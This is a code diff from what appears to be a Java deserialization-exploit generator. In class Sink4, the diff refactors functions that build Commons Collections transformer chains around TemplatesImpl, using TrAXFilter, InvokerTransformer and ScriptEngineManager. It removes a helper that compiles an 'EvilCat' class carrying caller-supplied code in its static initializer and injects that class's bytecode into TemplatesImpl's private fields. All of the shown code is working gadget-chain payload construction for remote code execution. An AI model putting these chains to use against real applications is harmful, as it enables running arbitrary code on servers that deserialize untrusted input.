@@ -32,7 +32,7 @@ public class Sink4 {
     }
 
     public static SinkResult TemplatesImplTrAXFilterSink(String code) throws Exception {
-        TemplatesImpl templates = generateTemplates(code);
+        TemplatesImpl templates = Utils.generateTemplates(code);
 
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(TrAXFilter.class),
@@ -44,7 +44,7 @@ public class Sink4 {
     }
 
     public static SinkResult TemplatesImplNewTransformerSink(String code) throws Exception {
-        TemplatesImpl templates = generateTemplates(code);
+        TemplatesImpl templates = Utils.generateTemplates(code);
 
         Transformer transformer = new InvokerTransformer("newTransformer", null, null);
 
@@ -62,27 +62,5 @@ public class Sink4 {
         Transformer transformer = new ChainedTransformer(transformers);
 
         return new SinkResult(SinkResultID.ScriptEngineManager, null, transformer, null);
-    }
-
-
-    private static TemplatesImpl generateTemplates(String code) throws Exception {
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
-        CtClass cc = pool.makeClass("Cat");
-        // 创建 static 代码块，并插入代码
-        cc.makeClassInitializer().insertBefore(code);
-        String randomClassName = "EvilCat" + System.nanoTime();
-        cc.setName(randomClassName);
-        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
-        // 转换为bytes
-        byte[] classBytes = cc.toBytecode();
-        byte[][] targetByteCodes = new byte[][]{classBytes};
-        TemplatesImpl templates = TemplatesImpl.class.newInstance();
-        Reflections.setFieldValue(templates, "_bytecodes", targetByteCodes);
-        // 进入 defineTransletClasses() 方法需要的条件
-        Reflections.setFieldValue(templates, "_name", "name" + System.nanoTime());
-        Reflections.setFieldValue(templates, "_class", null);
-        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
-        return templates;
     }
 }
